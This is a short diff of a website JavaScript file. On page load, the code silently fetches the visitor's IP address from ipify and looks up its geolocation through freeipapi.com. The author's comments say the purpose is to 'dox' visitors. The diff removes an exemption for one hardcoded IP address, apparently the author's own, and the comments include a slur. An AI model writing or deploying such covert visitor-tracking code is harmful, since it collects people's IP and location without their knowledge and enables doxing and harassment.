@@ -64,12 +64,6 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
     const IPdata = await IPresponse.json();
     const userIP = IPdata.ip; //get your ip with ipify cuz im retarded and dont know how to normally
 
-    // Block the script if the IP matches 109.81.163.104
-    if (userIP === '109.81.163.104') {
-      console.log('blocked ur ip:', userIP);
-      return; // Exit the function if the IP matches
-    }
-
     const dataResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`); //ermm when you enter the website it will send you ip to ipapi and ipapi will say hmm yes okay thats very hot now let me dox you rq
     const data = await dataResponse.json();
 
